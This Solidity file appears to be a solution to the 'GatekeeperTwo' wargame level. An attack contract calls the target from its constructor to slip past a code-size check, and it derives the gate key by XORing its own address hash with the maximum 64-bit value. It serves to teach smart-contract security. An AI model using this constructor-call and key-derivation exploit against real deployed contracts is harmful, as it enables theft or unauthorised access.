// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "./GatekeeperTwo.sol";

contract GatekeeperTwoAttack {
    GatekeeperTwo private target;

    constructor(address addr) public {
        target = GatekeeperTwo(addr);

        // A ^ B = C
        // A ^ C = B
        bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);

        target.enter(key);
    }
}
